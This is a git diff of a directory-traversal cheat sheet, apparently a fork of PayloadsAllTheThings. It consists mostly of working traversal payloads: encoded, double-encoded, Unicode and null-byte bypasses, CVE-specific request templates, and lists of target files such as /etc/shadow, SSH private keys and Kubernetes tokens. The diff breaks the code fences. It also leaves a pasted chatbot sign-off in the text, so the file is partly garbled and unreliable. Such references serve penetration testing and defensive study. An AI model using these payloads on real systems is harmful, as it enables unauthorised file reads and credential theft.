@@ -713,7 +713,13 @@ https://github.com/Anvesh464/PayloadsAllTheThings/blob/master/Open%20Redirect/RE
     ```
 ## Methodology
 
-We can use the `..` characters to access the parent directory, the following strings are several encoding that can help you bypass a poorly implemented filter.
+### URL Encoding
+
+| Character | Encoded |
+| --- | -------- |
+| `.` | `%2e` |
+| `/` | `%2f` |
+| `\` | `%5c` |
 
 ```powershell
 ../
@@ -725,16 +731,6 @@ We can use the `..` characters to access the parent directory, the following str
 %uff0e%uff0e%u2215
 %uff0e%uff0e%u2216
 ```
-
-### URL Encoding
-
-| Character | Encoded |
-| --- | -------- |
-| `.` | `%2e` |
-| `/` | `%2f` |
-| `\` | `%5c` |
-
-**Example:** IPConfigure Orchid Core VMS 2.0.5 - Local File Inclusion
 
 ```ps1
 {{BaseURL}}/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd
@@ -750,8 +746,6 @@ Double URL encoding is the process of applying URL encoding twice to a string. I
 | `/` | `%252f` |
 | `\` | `%255c` |
 
-**Example:** Spring MVC Directory Traversal Vulnerability (CVE-2018-1271)
-
 ```ps1
 {{BaseURL}}/static/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
 {{BaseURL}}/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
@@ -765,12 +759,9 @@ Double URL encoding is the process of applying URL encoding twice to a string. I
 | `/` | `%u2215` |
 | `\` | `%u2216` |
 
-**Example**: Openfire Administration Console - Authentication Bypass (CVE-2023-32315)
-
 ```js
 {{BaseURL}}/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp
 ```
-
 ### Overlong UTF-8 Unicode Encoding
 
 The UTF-8 standard mandates that each codepoint is encoded using the minimum number of bytes necessary to represent its significant bits. Any encoding that uses more bytes than required is referred to as "overlong" and is considered invalid under the UTF-8 specification. This rule ensures a one-to-one mapping between codepoints and their valid encodings, guaranteeing that each codepoint has a single, unique representation.
@@ -800,14 +791,9 @@ Sometimes you encounter a WAF which remove the `../` characters from the strings
 
 A null byte (`%00`), also known as a null character, is a special control character (0x00) in many programming languages and systems. It is often used as a string terminator in languages like C and C++. In directory traversal attacks, null bytes are used to manipulate or bypass server-side input validation mechanisms.
 
-**Example:** Homematic CCU3 CVE-2019-9726
-
 ```js
 {{BaseURL}}/.%00./.%00./etc/passwd
 ```
-
-**Example:** Kyocera Printer d-COPIA253MF CVE-2020-23575
-
 ```js
 {{BaseURL}}/wlmeng/../../../../../../../../../../../etc/passwd%00index.htm
 ```
@@ -819,8 +805,6 @@ Nginx treats `/..;/` as a directory while Tomcat treats it as it would treat `/.
 ```powershell
 ..;/
 ```
-
-**Example**: Pascom Cloud Phone System CVE-2021-45967
 
 A configuration error between NGINX and a backend Tomcat server leads to a path traversal in the Tomcat server, exposing unintended endpoints.
 
@@ -895,69 +879,46 @@ file, filename, filepath, path, dir, directory, folder, page, doc, document, dow
 ```
 Let me know if you'd like this exported into a Burp Intruder wordlist, YAML config, or integrated into your passive scanner logic. I can also help you build a matcher that auto-switches encoding variants (`../`, `%2e%2e%2f`, etc.) for each parameter. Ready to modularize it 🔧📁
 ---
-
+```
 ### **1. Basic Traversal Payloads**
-```text
 ../, ..\, ..//, ..\\, .../, ...\\
 ../../../../../../etc/passwd
 ..%2f..%2f..%2f..%2fetc/passwd
 ..%252f..%252f..%252f..%252fetc/passwd
-```
-
----
 
 ### **2. Encoded Variants**
-```text
 %2e%2e%2f, %252e%252e%252f
 %c0%ae%c0%ae%c0%af
 %uff0e%uff0e%u2215
 %u002e%u002e%u2215
-```
-
----
 
 ### **3. Bypass Techniques**
 ```text
 ..././, ...\\.\\, ..;/, ..%00/
 \\\\localhost\\c$\\windows\\win.ini
 ////////../../../../etc/passwd
-```
-
----
 
 ### **4. Target Files (Linux)**
 ```text
 /etc/passwd, /etc/shadow, /etc/hosts, /proc/self/environ, /proc/version
 /home/$USER/.bash_history, /home/$USER/.ssh/id_rsa
 /run/secrets/kubernetes.io/serviceaccount/token
-```
-
----
 
 ### **5. Target Files (Windows)**
 ```text
 c:/windows/system32/license.rtf
 c:/boot.ini, c:/inetpub/wwwroot/web.config
 c:/sysprep/sysprep.xml, c:/system32/inetsrv/metabase.xml
-```
-
----
 
 ### **6. Log File Injection Targets**
 ```text
 /var/log/apache/access.log
 /var/log/nginx/error.log
 /usr/local/apache2/log/error_log
-```
-
----
 
 ### **7. Common Parameters to Fuzz**
-```text
-file, filename, path, filepath, page, doc, download, include, template, view, url, resource, dir, folder, asset
-```
 
----
+file, filename, path, filepath, page, doc, download, include, template, view, url, resource, dir, folder, asset
 
 ### **8. HTTP Injection Points**
 - **Query**: `GET /?file=../../etc/passwd`
@@ -971,33 +932,19 @@ file, filename, path, filepath, page, doc, download, include, template, view, ur
 # **✅ Directory Traversal Attack – Complete Test Case (with Bypass Cases)**
 
 1 Basic Path Traversal (“../” sequences)
-
 2 Encoded Path Traversal (URL, Unicode, UTF-8)
-
 3 Double-Encoded Traversal
-
 4 Null Byte Injection (Legacy PHP/Java)
-
 5 Absolute Path Injection
-
 6 Filter Bypass using Nested Traversal
-
 7 Path Normalization Vulnerability
-
 8 Directory Traversal via File Upload
-
 9 Traversal inside ZIP, TAR extraction
-
 10 Traversal in API parameters (/download?file=)
-
 11 Log File / Sensitive File Exposure
-
 12 OS Command File Read Chaining
-
 13 Traversal via Path Overwrite (%2e%2e/)
-
 14 Mixed Encoding Traversal
-
 15 SSRF → Traversal on server-side FS
 
 ---
